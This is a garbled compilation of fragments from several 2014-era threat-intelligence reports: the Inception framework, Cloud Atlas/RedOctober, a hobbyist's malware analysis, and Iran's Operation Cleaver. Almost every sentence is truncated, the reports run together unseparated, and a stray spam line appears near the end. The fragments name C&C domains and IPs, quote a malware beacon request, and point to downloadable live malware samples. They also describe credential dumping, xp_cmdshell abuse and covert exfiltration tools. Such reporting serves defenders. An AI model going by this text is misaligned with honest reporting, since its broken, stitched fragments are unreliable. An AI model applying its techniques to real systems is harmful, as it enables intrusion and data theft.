The cloud accounts are not used for one - way communication only . The malware
One such case is the franko7046 account , used against the previously
Above : The configuration file of the depp3353 account . Password is redacted .
This is how we found the depp3353 account . In this new account there was
Downloaded plugins : Cloud persistence
The two new executables are plugins - quite similar to each other and obviously
None of these plugins contain any means of CnC communication . Instead , when
This model makes it possible to do the intrusion in steps , with verification stages
Based on the information gathered from these modules , the attackers appear to
What we assume to be third - stage plugins appear on the shares as * .bin files of
The Sheep and the Wolves
Victims of this attack will connect using the Windows WebDAV redirector , and
Security researchers – and there are a few of them - connect in a variety of ways ;
Some researchers set up scheduled tasks to scan the shares for new updates
Attackers , on the other hand , do n’t appear to use Windows .
Common across multiple accounts , multiple IP ’s , and over time , is that the
We know these are not researchers , because we can see malware files being
Above : Log entry for the account white3946 . We have been unable to locate the
We have a log fragment in which the attackers uploaded a sequential series of
The user - agent string shows that attackers likely have used a client based on the
This client is used when uploading new malware , but also when the attackers
An attacker scans the tem5842 account for updates .
At intervals , scans hop to new IP addresses .
The attackers have used a large number of IP addresses to access the shares .
As mentioned above , there is a rotation scheme in place in which a new IP
These IP ’s are distributed widely over geographical locations and service
S. Korea                                 85    Australia                                  1
China                                     7    Austria                                    1
United States                             7    Bulgaria                                   1
Brazil                                    5    Canada                                     1
Sweden                                    3    Denmark                                    1
Czech Republic                            2    France                                     1
Norway                                    2    Germany                                    1
Romania                                   2    Kuwait                                     1
Russia                                    2    Latvia                                     1
Spain                                     2    Ukraine                                    1
Distribution of attacker IP addresses
At first we thought these IP ’s belonged to some commercial proxy service ,
Support infrastructure
An embedded device proxy network
A superficial examination of the proxy IP addresses that connected to CloudMe
Korean Tera - EP home routers ; but there were several other products
It is believed that the attackers were able to compromise these devices based on
We were able to do some forensic work on a compromised Tera - EP TE-800
Router malware
Under the ramfs mounted partition we found a stripped and statically linked
Upon execution the binary uses its hardcoded key to decrypt the configuration
To prevent anyone else from accessing this service all communication on the
This setup makes it difficult to identify embedded devices compromised with this
In the wild we witnessed the attackers connect to the management port and
Additional servers
The router proxy network provides another layer of indirection masking the
We identified four IP addresses that connected to the proxy malware :
Cloud enumerator :
Apparently a rented server at AS34224 NETERRA - AS , Bulgaria
This host belongs to a Bulgarian VPS service and would use the router proxy to
Health checker :
Apparently a rented server at AS5577 ROOT root SA , Luxembourg .
This IP would make connections hourly and poll the status of the router proxy
Unlocker :
Apparently a rented server at AS52048 DATACLUB DataClub S.A. Latvia .
Traffic from this IP had a very specific purpose : It unlocked routers for proxying in
In the wild we observed this IP connect to our router on the malware
However , later we observed that the Email sender IP at VOLIA vanished and the
Unlocker server taking over its role as well .
Email sender :
An IP at AS25229 VOLIA - AS , Ukraine . Possibly a compromised host .
After a router SOCKSS port was opened by Unlocker , this IP would connect to
Each of these connections used the correct encryption key , so we know that
Mail proxies :
Through our router monitoring we identified two mail proxies used by the
These servers were hosted on domains that were registered by the attackers ,
The mail proxies were :
Registrant WHOIS information seems forged :
Pitea
Norrbottenalän
Observed phishing emails
The connections made from the Ukrainian host to the router were interesting .
After being proxied though the router , each of these would authenticate with one
From captured traffic it appears that the mail proxies have SOCKSv5 services
Above : Captured SMTP session , sending the malicious attachment MQ1474.doc
This way the attack can be mistaken to come from legitimate businesses and
The email shown above was one of a number of messages sent to targets in the
And then , the ground shifted again .
Attacks on mobile devices
One of the spearphishing mails we observed coming through the router network
Get WhatsApp now for your iPhone , Android , BlackBerry or Windows Phone
There was no executable attachment in this mail , but instead a link shortened by
The bit.ly service does however provide information on the user creating the
The nicolatesla53 bit.ly profile page
The nicolatesla53 account was created in July 2014 . From Oct 24th to Nov 21st
The links themselves were on this format :
As far as we were able to tell , there were three main types of action_code :
We have no sample of the actual MMS phishing messages apparently being
The password screen for action code 16611 ( TELE2 )
We were in the middle of harvesting the servers for data on the various action
The ones we know of are shown below . A full breakdown of mobile operators
The composition of links created for the various mobile operators is quite
Mobile and Proximus ( Belgacom ) it seems these apparent phishing attacks are
This map is not complete , though . It represents only about 35% ( 66/190 ) of all
The rest of the bit.ly links used the action codes 743 or 1024 . And now things
Mobile malware : Android
Accessing the link from an Android User - Agent initiated a download of an
Android installer package named WhatsAppUpdate.apk . The package we
The apparent main purpose of this malware is to record phone call audio .
Recordings are stored as * .mp4 files , and uploaded to the attackers periodically .
The malware is able to collect a lot of other information , not all of which is
Through the encrypted C&C protocol , the attackers can issue commands and
It uses a custom DAO / Database scheme which uses accounts belonging to the
The accounts all state that they belong to Iranian users . This is very likely false .
The text in these posts starts first out in cleartext , but quickly turns into
The three accounts contain different configuration blocks pointing to C&C servers
And then an unexpected oddity shows up in the Java source :
The sign in front of SizeRandomStr is “ Truti ” - a Hindi word meaning “ Error ” .
We were also able to download a similar malware sample ( BrowserUpdate.apk )
Mobile malware : Apple IOS
Using an IOS User - Agent triggered the download of a Debian installer package ,
This application impersonates a Cydia installer , and can only be installed on a
Once installed , it may collect
These data are encrypted and uploaded to an FTP account which is taken from
In this particular case , the FTP account is located on a legitimate ( if struggling )
In this case , there ’s another clue :
The project path in the package contains the name JohnClerk .
The WhatsAppUpdate project seems derived from an earlier template named
Mobile malware : Blackberry
By now , it came as no surprise when we triggered a download with a BlackBerry
User - Agent . The initial download was a Java Applications Descriptor , a text file
The application impersonates a settings utility . This collects :
Collected data will be uploaded to a DynDNS domain currently hosted on a US
Since these COD files are also compiled Java code , they are possible to
Attribution
Timelines and activity patterns
The earliest sample of Inception - related malware we have been able to obtain ,
Of interest is also the attackers’ activity patterns over the 24h cycle . The main
It is however doubtful how indicative these timeframes are . To illustrate , we
The code used in some of the DLLs indicate that the attackers tend to use the C
The encrypted files uploaded to the WebDAV shares come with their InitVectors
Unfortunately , we had to reject these data . The file creation times turned out to
The Chinese connection
On at least two occasions during our surveillance of the Inception framework , the
These files were downloaded as encrypted * .bin files from the accounts
This executable , ( sccm.exe , md5 dd8790455109497d49c2fa2442cf16f7 ) is a
The C&C server in this case is ict32.msname.org .
When connecting to this server , sccm.exe issues the following request :
Accept : * /* .. Accept - Language : en - us
Content - Type : application / octet - stream
Accept - Encoding : gzip , deflate
User - Agent : Mozilla/4.0 ( compatible ; MSIE 6.0 ; Windows NT 5.1 ; SV1 )
Host : www.antivir.com
Content - Length : 8
Connection : Keep - Alive
Cache - Control : no - cache
This C&C domain is used by many other malwares related to sccm.exe ; some of
This development was unexpected for several reasons . First of all , it apparently
Another factor which is out of character is the coding style . All Inception - related
This date can be forged , and indeed , all Inception - related malware has some
Then there is the C&C domain used . According to DomainTools.com the
Because of all this we consider sccm.exe as an unreliable indicator . It is likely to
An odd indicator
At one instance the attackers seem to have slipped up . Instead of using their
This is visible because the request came from an apparent attacker IP , but used
Gvfs is the virtual filesystem for Gnome desktop . The action on the account was
When WebDAV shares are mapped up as drives by the operating system , any
This might indicate that the attacker ’s operating system language is Spanish .
Of course , Spanish is one of the world ’s most widespread languages , so one
Similarities with Red October
This attack system shares a number of properties that are somewhat similar with
For more information about this see :
The " Red October " Campaign - An Advanced Cyber Espionage Network
Targeting Diplomatic and Government Agencies
Car for sale ” )
However , there are also clear differences . The code is fully rewritten ; there
The Red October malware contained linguistic markers that pointed towards
Russian speaking attackers . No such clues have been found in the Inception-
It is certainly possible that the same people have organized both Inception and
Red October , but there are no clear indications to this effect .
Strings in malware
The Windows - based malware in this paper generally contains very few
This changes a bit when we look at the mobile malware . In the Android malware
These and other indicators have led us to conclude that the Inception attackers
Conclusion
The whole Inception setup shows signs of automation and seasoned
The names of the files both when dropped and their original names along with
The attackers utilize compromised embedded devices – typically routers- on the
Internet as well as multiple dedicated hosting providers and VPN services to
This suggests that this a large campaign and we ’ve only seeing the beginning of
It is clear that this infrastructure model does not need to be applied solely against
The attribution indicators point in different directions and ca n’t be given much
K9 , the K9 logo , DRTR , Mach5 , Packetwise , Policycenter , ProxyAV , ProxyClient , SGOs , WebPulse , Solera Networks , the Solera Networks logos , DeepSee , “ See Everything . Know
Everything . ” , “ Security Empowers Business ” , and BlueTouch are registered trademarks or trademarks of Blue Coat Systems , Inc. or its affiliates in the U.S. and certain other
Exploited RTF sample md5 ’s :
Dropped first - stage DLL ’s
Downloaded second - stage plugins :
Downloaded Chinese malware , sccm.exe :
Router proxy malware :
Android malware :
Blackberry malware :
Verified malicious CloudMe accounts ( based on malware ) :
Likely malicious CloudMe accounts ( based on access patterns ) :
Action Code      Operator                 HQ location     Links created
Undetermined MMS phishing action codes ( code , number of links ) :
Attacker - owned domains :
Acknowledgements
The following entities have helped in big and small ways . Big thanks to all .
Crowdstrike
F - Secure Corporation
Kaspersky Labs
Symantec Corporation
We also owe a big debt of gratitude to Ryan W. Smith of Blue Coat who helped
Cloud Atlas : RedOctober APT is back in style
Two years ago , we published our research into RedOctober , a complex cyber - espionage operation
After our announcement in January 2013 , the RedOctober operation was promptly shut down and the
See :
Since January 2013 , we 've been on the lookout for a possible RedOctober comeback . One possible hit was
C&C name styles as well as some other technical similarities indicated a connection to RedOctober , but the
Meet Cloud Atlas
In August 2014 , some of our users observed targeted attacks with a variation of CVE-2012 - 0158 and an
Some of the filenames used in the attacks included :
Катастрофа малайзийского лайнера.doc
Diplomatic Car for Sale.doc
Organigrama Gobierno Rusia.doc
Информационное письмо.doc
Форма заявки ( 25 - 26.09.14).doc
Информационное письмо.doc
Car for sale.doc
Af - Pak and Central Asia 's security issues.doc
At least one of them immediately reminded us of RedOctober , which used a very similarly named
Perhaps the most unusual fact was that the Microsoft Office exploit did n't directly write a Windows PE
Cloud Atlas exploit payload - VBScript
This VBScript drops a pair of files on disk - a loader and an encrypted payload . The loader appears to be
We observed several different spear - phishing documents that drop uniquely named payloads . For
The VBS also adds a registry key :
Some of the DLL names we observed include :
Some of the payload names include :
The payload includes an encrypted configuration block which contains information about the C&C sever :
The information from the config includes a WebDAV URL which is used for connections , a username and
C&C communication
The Cloud Atlas implants utilize a rather unusual C&C mechanism . All the malware samples we 've seen
According to their website , CloudMe is owned and operated by CloudMe AB , a company based in
Linköping , Sweden .
Each malware set we have observed so far communicates with a different CloudMe account though . The
Here 's a look at one such account from CloudMe :
The data from the account :
The files stored in the randomly named folder were uploaded by the malware and contain various things ,
We previously observed only one other group using a similar method – ItaDuke – that connected to
Victim statistics : top 5 infected countries
Similarities with RedOctober
Just like with RedOctober , the top target of Cloud Atlas is Russia , followed closely by Kazakhstan ,
Interestingly , some of the spear - phishing documents between Cloud Atlas and RedOctober seem to exploit
Both Cloud Atlas and RedOctober malware implants rely on a similar construct , with a loader and the final
The usage of the compression algorithms in Cloud Altas and RedOctober is another interesting similarity .
Both malicious programs share the code for LZMA compression algorithm . In CloudAtlas it is used to
It turns out that the implementation of the algorithm is identical in both malicious modules , however the
Another interesting similarity between the malware families is the configuration of the build system used
We have been able to identify several RedOctober binaries that have " Rich " headers describing exactly the
Number of object
Number of object       Number of object
Fileputexec            version                version
To summarize the similarities between the two :
Cloud Atlas                     RedOctober
Shellcode marker in spearphished
Top target country                       Russia                          Russia
Compression algorithm used for
C&C communications
C&C servers claim to be / redirect to    BBC ( mobile malware )            BBC
Compiler version                         VC 2010 ( build 30319 )
Finally , perhaps the strongest connection comes from targeting . Based on observations from KSN , some
These and other details make us believe that CloudAtlas represents a rebirth of the RedOctober attacks .
Conclusion
Following big announcements and public exposures of targeted attack operations , APT groups behave in a
Other groups that are more nervous about exposure go in a hibernation mode for months or years . Some
However , when a major cyber - espionage operation is exposed , the attackers are unlikely to completely
We believe this is also the case of RedOctober , which makes a classy return with Cloud
Atlas .
Kaspersky products detect the malware from the Cloud Atlas toolset with the following verdicts :
Exploit . Win32.CVE-2012 - 0158.j
Exploit . Win32.CVE-2012 - 0158.eu
Exploit . Win32.CVE-2012 - 0158.aw
Exploit . MSWord . CVE-2012 - 0158.ea
Trojan - Spy . Win32.Agent.ctda
Trojan - Spy . Win32.Agent.cteq
Trojan - Spy . Win32.Agent.ctgm
Trojan - Spy . Win32.Agent.ctfh
Trojan - Spy . Win32.Agent.cter
Trojan - Spy . Win32.Agent.ctfk
Trojan - Spy . Win32.Agent.ctfj
Trojan - Spy . Win32.Agent.crtk
Trojan - Spy . Win32.Agent.ctcz
Trojan - Spy . Win32.Agent.cqyc
Trojan - Spy . Win32.Agent.ctfg
Trojan - Spy . Win32.Agent.ctfi
Trojan - Spy . Win32.Agent.cquy
Trojan - Spy . Win32.Agent.ctew
Trojan - Spy . Win32.Agent.ctdg
Trojan - Spy . Win32.Agent.ctlf
Trojan - Spy . Win32.Agent.ctpz
Trojan - Spy . Win32.Agent.ctdq
Trojan - Spy . Win32.Agent.ctgm
Trojan - Spy . Win32.Agent.ctin
Trojan - Spy . Win32.Agent.ctlg
Trojan - Spy . Win32.Agent.ctpd
Trojan - Spy . Win32.Agent.ctps
Trojan - Spy . Win32.Agent.ctpq
Trojan - Spy . Win32.Agent.ctpy
Trojan - Spy . Win32.Agent.ctie
Trojan - Spy . Win32.Agent.ctcz
Trojan - Spy . Win32.Agent.ctgz
Trojan - Spy . Win32.Agent.ctpr
Trojan - Spy . Win32.Agent.ctdp
Trojan - Spy . Win32.Agent.ctdr
Trojan . Win32.Agent.idso
Trojan . Win32.Agent.idrx
Trojan . AndroidOS.Cloudatlas.a
Trojan . IphoneOS.Cloudatlas.a
Parallel research :
Blue Coat Exposes Inception Framework
It 's friday afternoon , I had a bit of free time and stumbled across this tweet by PhysicalDrive0 ( thx ! ) two
So , I went to Google to search for the domain of the Embassy of Greece Beijing and added the ( allegedly )
Next , I loaded the 1.jar file into Java Decompiler to get the source code . It showed , that the functionality is
There are some other obfuscation techniques , but they are not important here . Instead , the following
Resp localResp = new Resp(csfn("234p34a55445c43654k632434234235 " ) ) ; - > pack
We can also see , that the java package contains a file named pack , so we open 7-Zip and unpack the file . A
Figure 2 : Payload inside Java package
Figure 3 : Payload inside PE viewer
So , I opened IDA Pro to take a quick look at the functionality . Together with the strings of the executable ,
Together with the output of IDA Pro , we can see that this malware uses the command line tool cmd.exe for
Explorer ( d30c1661-cdaf-11d0 - 8a3e-00c04fc9e26e - > IWebBrowser2 ) , supposedly to contact its C&C
C&C server : defense.miraclecz.com ( IP : 208.115.124.83 )
Also , we see that it downloads some kind of data ( Base64 encoded ) . But first , we combine the C&C server
Figure 4 : Base64 encoded ( 2nd ) Payload
As you can see , there is a string named microsoft followed by Base64 encoded data . Side note : Is there
Next , we copy the Base64 encoded data and go to the following website to let us decode it into a file
As a result , we get another executable ( SHA256 :
Figure 5 : Downloaded Payload
So again , we fire up our PE viewer and take a look at the important strings :
Run cmd error % d
Again , we load the executable into IDA Pro and quickly fly over the assembly code to get an idea of the
C&C server : buy.miraclecz.com ( IP : 74.121.191.33 )
From the code we can see , that the sample has also the ability to encode / decode data from / to Base64 . The
The files can be downloaded here :
Password : " infected " ( without " ")
That 's it , have a nice weekend ...
Gabi Siboni
Israel Institute for National Security Studies cybersecurity expert
Retired Admiral William J. Fallon
Former Commander CENTCOM
Mark Weatherford
Former Deputy Under Secretary for Cybersecurity at the US Department of Homeland Security
Admiral Michael Rogers
Director of the National Security Agency and head of US Cyber Command
Jeff Moss
Co - Chair DHS Community Resiliency Task Force , Founder of DEFCON and BlackHat
Jalal ad - Din Muhammad Rumi
English translation : “ Silence gives answers . ”
A personal note from Cylance , CEO Stuart McClure
O
The United Flight 811 accident proves just how important it is to detect flaws before tragedy strikes . Preventable
This report is an attempt to deliver on that mission .
After tracking hackers both personally
The focus of the Operation Cleaver report is on one particular Iranian team we ’ve dubbed Tarh Andishan , the
Andishan actively targeting , attacking , and compromising more than 50 victims since at least 2012 .
Cylance is committed to responsible disclosure and has refrained from exaggeration and embellishment in this
We have made every effort to notify all affected entities prior to publishing this report . Additionally , all personally
This report is for the world ’s cyber defenders – never give up !
Sincerely ,
Stuart McClure
Cylance , Inc.
Executive Summary ......................................................................... 5
Background ........................................................................................ 6
Why the name “ Cleaver ” ? ............................................................. 8
Why Expose Iran Now ? .................................................................. 8
Critical Discoveries ......................................................................... 9
Targets & Victims ............................................................................ 12
Attribution ......................................................................................... 17
Attacker IP Addresses .............................................................. 18
Attacker Domains ...................................................................... 19
Tools & Software ........................................................................ 20
Tarh Andishan ............................................................................ 24
Members ...................................................................................... 26
Teams ............................................................................................ 30
Tactics , Techniques & Procedures ( TTPs ) ............................... 31
Initial Compromise ..................................................................... 32
Privilege Escalation & Pivoting ............................................... 36
Exfiltration .................................................................................... 41
Persistence .................................................................................. 47
Mitigation .......................................................................................... 60
Speculation : The Why ................................................................... 62
Conclusion ........................................................................................ 65
References ........................................................................................ 67
About Cylance ................................................................................. 68
Cylance Products ........................................................................... 69
Cylance Services ............................................................................ 70
Acknowledgments ...................................................................... 71
The Operation Cleaver Logo ...................................................... 72
Appendix A : Indicators of Compromise ( IOC ) ........................ 73
Since at least 2012 , Iranian actors have directly attacked ,
Canada , China , England , France , Germany , India , Israel ,
Kuwait , Mexico , Pakistan , Qatar , Saudi Arabia , South Korea ,
Turkey , United Arab Emirates , and the United States .
Iran is the new China .      44
Operation Cleaver has , over
The group successfully leveraged both publicly available , and customized tools to attack and
During intense intelligence gathering over the last 24 months , we observed the technical
Iranian effort . As Iran ’s cyber warfare capabilities continue to morph,2 the probability of an attack
With minimal separation between private companies and the Iranian government , their modus
Iran ’s rising expertise , along with their choice of victims , has compelled us to release this report
Iran has been severely impacted by debilitating and extremely
Stuxnet ( 2009 - 2010 ) , and espionage with Duqu ( 2009 - 2011 )
Hacking campaigns sourced out of Iran are nothing new . Since the early 2000 ’s , the information
A major retaliation came in the form of 2012 ’s Shamoon campaign , which impacted RasGas and
Saudi Aramco . It ’s estimated that Shamoon impacted over 30,000 computer endpoints and cost
Cleaver : establishing a beachhead for cyber sabotage .
We saw further Iranian backlash in late 2012 and early 2013 in the form of Operation Ababil ’s
Distributed Denial of Service ( DDoS ) attacks against US banks . These attacks were debilitating and
In June 2013 , Israeli Prime Minister Benjamin Netanyahu accused Iran of carrying out “ non - stop ”
September of 2013 , the Wall Street Journal accused Iran of hacking into unclassified U.S. Navy
Operation Cleaver .
While previously reported operations attributed to Iran have largely focused on Defense Industrial
Base ( DIB ) companies , the United States Federal Government , or targets in Middle Eastern countries ,
Operation Cleaver has instead focused on a wide array of targets , including energy producers
They have bigger intentions : to position themselves to impact critical infrastructure globally .
Ababil
Saffr n Rose
Figure 1 : The sequence of major Iran - centric attacks ; either as victims ( left ) or attackers ( right ) .
The string cleaver is found several times in a variety of custom software used in Operation
Cleaver , including :
We believe our visibility into this campaign represents only a fraction of Operation Cleaver ’s full
Iranian Actors Are Behind Operation Cleaver
Bahman Mohebbi , Kaj , Parviz , Alireza , and numerous others .
Andishan , which translates to “ invention ” or “ innovation ” in Farsi .
Operation Cleaver Targets Critical Infrastructure Around the World
Iran ’s Cyber Hacking Skills Have Evolved
Windows privilege escalations , and were coupled with automated , worm - like propagation
Indicators of Compromise ( IOC )
Speculation
This campaign continues Iran ’s retaliation for Stuxnet , Duqu , and Flame .
This is a state - sponsored campaign .
There is a possibility that this campaign could affect airline passenger safety .
This campaign ’s intentions may be to damage Industrial Control Systems ( ICS ) , Supervisory
Control and Data Acquisition ( SCADA ) systems , and impact Critical Infrastructure and Key
Resources ( CIKR ) .
The Cleaver team targets some of the most sensitive global critical infrastructure companies in the
Industrial Base ( DIB ) , chemical companies and governments . Countries impacted include Canada ,
China , England , France , Germany , India , Israel , Kuwait , Mexico , Pakistan , Qatar , Saudi Arabia , South
Korea , Turkey , United Arab Emirates , and the US .
The following is a breakdown by country of which industries were targeted and/or victimized :
Canada                        Kuwait                     South Korea
China                         - Oil & Gas                - Heavy Manufacturing
Pakistan                   Turkey
England
France                        - Airlines                 - Government
Qatar
Germany                       - Oil & Gas
United States
India                       86                           - Chemicals
Israel                                                  - Defense Industrial Base
Cleaver ’s level of access into each organization varied greatly , including completely compromised
Compromised systems include Microsoft Windows web servers running IIS and ColdFusion ,
Apache with PHP , many variants of Microsoft Windows desktops and servers , and Linux servers .
Compromised network infrastructure included Cisco VPNs as well as Cisco switches and routers .
Unlike Stuxnet , no exotic exploitations ( such as 0-days ) were observed .
Within our investigation , we had no direct evidence of a successful compromise of specific
Industrial Control Systems ( ICS ) or Supervisory Control and Data Acquisition ( SCADA ) networks , but
Cleaver did exfiltrate extremely sensitive data from many critical infrastructure companies allowing
We discovered over 50 victims in our investigation , distributed around the globe . Ten of these
Universities were targeted in the US , India , Israel , and South Korea . The attackers targeted research
Perhaps the most bone - chilling evidence we collected in this campaign was the targeting and
Saudi Arabia and Pakistan . The level of access seemed ubiquitous : Active Directory domains
B
A               A                    5                                         B                      22
B
A                                 A                        7
B
A                                                                                                                    21
B                                             23
B          B
A                                                                                 B
Figure 2 : Geographic distribution of victims , as determined by the global headquarters of the parent
S
E
N
G
L
N
N
T
O
S
O
S
O
G
I
A
A
I
I
O
M
O
N
T
O
D
O
O
H
M
O
M
G
M
D
Figure 3 : Number of Cleaver victims by the level of access obtained as well as the level of critical impact potential .
Despite today ’s trend toward attacker attribution , we believe
However , in this report we offer our observations on the
Operation Cleaver is believed to consist of at least 20
For a complete list of IPs and domains related to this
Guardians of the Islamic Revolution ,
Guard Corps ( IRGC ) .
Over the course of multiple incident response engagements related to Operation Cleaver , we
The IP address 78.109.194.114 served as a source for one of the primary attackers .
They were observed conducting SQL injections , controlling backdoors , as well as exfiltrating
Net block : 78.109.194.96 - 78.109.194.127
Owner : Tarh Andishan
Email : tarh.andishan(at)yahoo.com
Phone : + 98 - 21 - 22496658
This IP address was also observed in multiple software configurations . This particular net block
Andishan section of this report .
The IP address 159.253.144.209 was a source for a secondary attacker in various
Net block : 159.253.144.208 - 159.253.144.223
A number of Cleaver ’s attack methods require a persistent server . In many cases , these servers
As is typical with malicious domains , the Whois data for most of these domains contained falsified
We managed to obtain a large collection of the internally developed tools used by the Cleaver
Shell Creator 2
In the tool named Shell Creator 2 , there are three main components . The creator generates
The shell client is a portion of Shell Creator 2 that was not designed to be run on a compromised
The shell client , which is developed in Java and is easily decompiled , is a simple interface with
The assumed purpose of this feature is to ensure that a proper proxy is in use , and the real origin
After decompiling the shell client , we found the following code segment controlling the display of
Figure 5 : Java source code showing how Shell Creator 2 distinguishes between a source IP address
This code handles the XML response from freegeoip.net , and displays the information
Shell Creator 2 ( cont . )
Figure 6 : Shell Creator 2 alerts the user in red when the IP being used can be sourced to Iran .
Figure 7 : Shell Creator4
Net Crawler
Net Crawler is a tool developed in C # that exhibits worm - like behavior in order to gather cached
Windows Credential Editor ( WCE ) and Mimikatz in combination with PsExec . Different versions of
Figure 8 : Net Crawler version 1.0 has ASCII art showing                 Figure 9 : Updated ASCII art found in Net
For more information on Net Crawler , see the Tactics , Techniques and Procedures section .
C # , many versions can be decompiled to code very similar to their originals , including names
We obtained multiple versions from which we were able to recover many of the original names of
Zhopin Exploit Team
This is not the only case of this team relabeling others’ work as their own .
Logger Module
Logger module is a component of the PVZ ( PVZ is shorthand for Parviz , one of the members of
Roughly translated from Persian , this text says :
Logger Module ( cont . )
This text could potentially be a note intended to stay internal , or could be an attempt to persuade
For more information on the PVZ bot tool chain , see the Tactics , Techniques , and Procedures
We do not believe that this organization was involved in the development or modification of
The configuration allowed for remote
This IP address is located in Iran , and is owned by
Tarh Andishan .
The configuration also indicates which address
Figure 10 ( above ) : CCProxy configuration file
Andishan .
Figure 11 ( left ) : CCProxy configuration file showing the
Log output from the network port scanning application NMAP was recovered from a staging
Starting Nmap 6.25 at 2012 - 08 - 17 09:18 Iran Daylight Time
With no known victims located in Iran , it is likely that this was executed on an attacker ’s computer ,
Squid Configuration
A configuration file for a Squid proxy server was recovered .
Figure 12 : Squid configuration file showing the use of Tarh Andishan ’s IP address .
The net range of 78.109.194.114/28 was inserted into the allowed local networks with an RFC
Tarh Andishan is listed as the registrant for a number of small net blocks based upon the email
The networks are included below as well as the last time that net block was observed as active .
There are many seemingly legitimate Tarh Andishan related companies inside Tehran , but strong
The net blocks above have strong associations with state - owned oil and gas companies . These
Tarh Andishan has been 2
In one of IranRedLine.org ’s blog posts8 , the author speculates on Tarh Andishan ’s involvement
Innovation and Research ; however , the phone number listed under the registrant contact
Figure 13 : This image from IranRedLine.org demonstrates Tarh Andishan ’s probably fabricated Whois
During this investigation , we were able to compile a considerable amount of information on some of
Parviz
Parviz is a developer who worked on a variety of projects , and was primarily active in 2013 . His
Visual Studio 2010 , and his tools are written exclusively for Windows . Some of his tools were found
Parviz is the primary developer of the PVZ bot and multiple parts of its tool chain . Parviz is likely
The PVZ tool chain includes a variety of functionality , such as HTTP command and control
Nesha
Nesha is one of the offensive members of this organization . Nesha was seen in breaches involving
Nesha ’s passwords very commonly include own handle . His passwords were frequently stored
Cylance observed Nesha participating in compromises involving the following techniques :
Nesha has additionally been identified using a variety of internally developed tools as well as the
Alireza
Alireza appears to be one of the senior developers of this organization . His tools are commonly
This is not behavior typical of a professional development team .
Alireza ( cont . )
Alireza ’s C # tools include the following techniques :
Alireza ’s Java tools include the following techniques :
Alireza ’s C++ tools include the following techniques :
He has been observed developing tools which cater to specific challenges in a compromise . His
Tactics , Techniques and Procedures section . Thanks to a recovered test configuration for Net
Crawler , we were able to determine that kaJ ’s development computer has the name dev - castle ,
Jimbp
Jimbp is a .NET developer with minimal experience . His projects appear to be supplemental to
Of course many associated Iranian hacker teams have been identified in public and private
Islamic Cyber Resistance Group , Izz ad - Din al - Qassam Cyber Fighters , Parastoo , Shabgard , Iran
Black Hats and many others9 .
However , even though the TTPs of the Cleaver team have some overlap to techniques used by
Iranian Cyber Army ( botnets ) , Ashiyane ( SQL injection ) and Syrian Electronic Army ( phishing and
Ultimately we believe the Cleaver team is a mix of existing team members and new recruits
The Cleaver campaign used a variety of methods in multiple stages of attacks . In this section we ’ll
The initial compromise gets the attackers their first foothold into the target network . Once the
The attackers would enable xp_cmdshell :
Then connect outbound via anonymous FTP :
Spear - Phishing Campaign
Using messaging methods such as email , attackers can social engineer users into downloading
Operation Cleaver has employed this technique numerous times across different organizations .
The domain EasyResumeCreatorPro.com was registered and a website setup which was a direct
Figure 14 : The original Easy Résumé Creator Pro website on winresume.com is legitimate .
Figure 15 : The fraudulent website , easyresumecreatorpro.com , is a fraudulent copy of the Easy
Resume Creator Pro website to lure job candidates to download and install their TinyZBot agent .
That ’s not all they copied . In order to infect users , they combined the original Easy Resume Creator
Pro product with malware by using a binder they developed internally named Binder_1 . A binder
The resulting executable masquerades as the desired software . The purpose is deception , to make
Teledyne Résumé Submitter
This attack evolved to appear more legitimate . The
Figure 16 : When the résumé submitting
At this point , the résumé submission application checks the
Internet connection . If it is unable to connect to the Internet ,
When this information is entered , the results are cached
Internet connection is ensured , the malware ( TinyZbot ) is
Figure 17 : Unable to connect to the Internet , the
Figure 18 : Final résumé submission form
Teledyne Résumé Submitter ( cont . )
The first résumé submission form requests contact information . This form , like the rest of the
Figure 19 : GET request to www.microsoft.com fakes the résumé submission .
When the victim hits submit , the résumé submitter does a GET request to microsoft.com in order
This method is particularly effective not only because of its level of deception , but even if the victim
Privilege escalation is a category of techniques that describe the process of going from a less
This team did not utilize any novel methods of privilege escalation , but they were observed
This vulnerability and the corresponding exploit were discovered and developed in 2010 .
The plagiarized version used in Operation Cleaver was compiled in May 2013 , with a slight
Exploit Team .
Pivoting is the process of leveraging access from one compromised computer in order to gain
Cached Credential Dumping
A very common method of pivoting on a predominantly Windows operating system based
Windows Credential Editor .
Two similar applications were developed by Operation Cleaver in order automate the execution
In the following examples , the computer name is TheComputerName , the username of the
Figure 20 : zhMimikatz
Output from MimikatzWrapper is essentially the same as zhMimikatz , despite being a different
Visual Studio project .
Figure 21 : The MimikatzWrapper .
The only external difference is that MimikatzWrapper also logs these results to res.txt in the
Figure 22 : The MimikatzWrapper dumps credentials out to a file .
Once an attacker has credentials extracted from the cache , whether in hash form or in plaintext
Net Crawler utilizes a cached credential dumping technique along with PsExec in order to
When a positive result has been achieved , it will create a copy of itself with a modified
The following is a sample of some of the recovered results of Net Crawler executing on a live
Figure 23 : The real output of a successfully run NetC effort at a victim organization .
A more in depth analysis of Net Crawler , as part of the A Study in Bots series , will be available on
Cylance ’s blog .
Operation Cleaver used a plagiarized version of a publicly available exploit for this vulnerability
Jasus
Jasus is an ARP cache poisoner developed by the Operation Cleaver team . It makes use of
Cain & Abel
Cain & Abel is a publicly available toolkit , which covers a wide range of functionality that assists
We observed the Operation Cleaver team using Cain & Abel for extracting credentials from caches
Exfiltration is the process of moving information to an external site . In this context , it is the process
Anonymous FTP Servers
Cleaver Operations observed in 2013 mainly utilized FTP servers with anonymous access
The following IP addresses hosted FTP servers that were used in the infection of targets or in
The changes made in zhCat allow for this information to be transferred with inline obfuscation and/
The command line help ( of a particular version ) shows the following options :
Multiple obfuscation / encryption methods are available . The –h argument enables HTTP mode .
This makes the traffic between zhCat instances look like benign HTTP traffic . For instance , if the
The server instance would use the following command :
When we run both of these , we can send information just by typing it into the terminal of the
If we observe the network communications during this transfer , we can see the following HTTP
Note : research into ebizmba.com did not turn up any additional evidence of being involved
On the server side , we can see our message has been received :
If stricter egress filtering is enabled , the attackers can use zhCat to also XOR encrypt the traffic
Sorry ! The handle to file % s is not a valid handle any more.\nSorry !
The handle to file % s is not a valid handle any more .
The \n represents hex character 0x0A , which is a new line character .
An attacker could set up a server instance of zhCat with the following command in order to
The client instance could then be invoked with the following command :
Once again , information can be supplied via standard input .
Upon inspecting the network traffic again , we see the following HTTP POST request .
On the server side , we can
The SSH protocol is a heavily utilized encrypted protocol , most commonly used for remote
Operation Cleaver uses PLink to forward local RDP ports to remote SSH servers . This allows them
Early Cleaver operations abused SMTP in order to exfiltrate information . The sending is
No Prescription required . Viagra Dosages : 25 , 100 , 150 mg .
Fast worldwide delivery .
The message used is the following :
